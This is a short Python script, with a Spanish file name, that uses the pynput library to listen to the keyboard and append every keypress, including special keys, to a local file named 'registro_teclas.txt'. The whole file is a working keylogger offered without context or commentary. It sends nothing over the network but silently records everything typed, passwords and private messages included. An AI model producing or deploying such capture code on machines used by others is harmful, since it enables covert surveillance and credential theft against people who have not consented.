from pynput import keyboard

def on_press(key):
    try:
        with open("registro_teclas.txt", "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("registro_teclas.txt", "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
